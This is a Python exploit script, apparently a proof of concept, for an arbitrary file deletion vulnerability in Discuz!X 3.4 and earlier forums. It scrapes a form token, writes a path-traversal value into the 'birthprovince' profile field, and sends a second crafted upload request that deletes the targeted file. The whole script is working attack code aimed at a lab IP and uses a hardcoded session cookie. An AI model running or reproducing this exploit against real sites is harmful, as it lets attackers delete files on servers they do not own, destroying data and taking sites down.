# -*- coding: utf-8 -*- 
# @Time : 2022/4/1 16:22 
# @Author : hummer
# @File : Discuz.py

import requests
import re

'''
Discuz!X <=3.4 任意文件删除漏洞
'''


def get_cookie():
    cookies={}
    for line in raw_cookies .split(';'):
        key,value = line.split('=',1)
        cookies[key]=value
    return cookies

def get_formhash(url):
    cookies = get_cookie()
    testurl = url + "/home.php?mod=spacecp"
    html = requests.get(testurl,cookies=cookies)
    com = re.compile('<input type="hidden" name="formhash" value="(.*?)" />')
    result = com.findall(html.text)
    return result[0]

def del_step1(url,filename):
    headers={
        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0',
    }
    geturl = url + "/home.php?mod=spacecp&ac=profile&op=base"
    formhash=get_formhash(url)
    print("formhash: " + formhash)
    payload = {'birthprovince':filename,'profilesubmit':1,'formhash':formhash}
    cookies = get_cookie()
    html = requests.post(geturl,headers=headers,data=payload,cookies=cookies)
    if html.text.find('parent.show_success')>0:
        print('Step1 success!')

def del_step2(url):
    geturl = url + '/home.php?mod=spacecp&ac=profile&op=base&deletefile[birthprovince]=aaaaaa'
    headers = {'User-Agent':'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0'}
    formhash = get_formhash(url)
    files = {'formhash':(None,formhash),'birthprovince':('1.jpg',open('1.jpg','rb'),'image/jepg'),'profilesubmit':(None,1)}
    cookies = get_cookie()
    r = requests.post(geturl,files=files,headers=headers,cookies=cookies)
    if r.text.find('parent.show_success')>0:
        print("Step2 success!")

if __name__ == '__main__':
    raw_cookies = "QEWn_2132_saltkey=jB44A7n7; QEWn_2132_lastvisit=1648895823; QEWn_2132_sid=KrpF5f; QEWn_2132_lastact=1648899609%09home.php%09misc; QEWn_2132_sendmail=1; QEWn_2132_seccode=1.21187a98997a88f189; QEWn_2132_ulastactivity=9ebcAx%2FzsiL2Ju3gB4nnVG5GBBHyFTeCzO6%2FbmGu9WxSCw8brZTS; QEWn_2132_auth=afde08MuW%2BAKdFLrgYSqhflGjsYLnWVSBtpPs6HBpmnwkPkewQvRZIgT1G6mgVSIU7FxCC9L84iX7RSX2PIb; QEWn_2132_nofavfid=1; QEWn_2132_onlineusernum=1; QEWn_2132_noticeTitle=1"

    url = 'http://10.10.10.145'
    del_step1(url,'../../../hummer.txt')
    del_step2(url)